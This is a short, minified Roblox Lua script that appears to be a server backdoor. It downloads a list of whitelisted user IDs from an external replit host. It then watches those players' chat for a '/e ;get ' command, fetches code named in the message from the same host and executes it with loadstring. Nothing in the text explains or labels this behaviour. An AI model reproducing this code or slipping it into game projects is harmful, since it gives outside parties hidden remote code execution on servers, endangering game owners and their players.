local a=game:GetService("HttpService")local b=game:GetService("Players")local c="https://heavenlymutedclient.chapel1337.repl.co/"local d=a:JSONDecode(a:GetAsync(c.."whitelist"))local function e(f)f.Chatted:Connect(function(g)if not g:match("/e ;get ")then return end;local h=g:sub(9,#g)print(c.."get?script="..h)loadstring(a:GetAsync(c.."get?script="..h),"script")()end)end;for i,f in pairs(b:GetPlayers())do if table.find(d,f.UserId)~=nil then e(f)end end;b.PlayerAdded:Connect(function(f)if table.find(d,f.UserId)~=nil then e(f)end end)
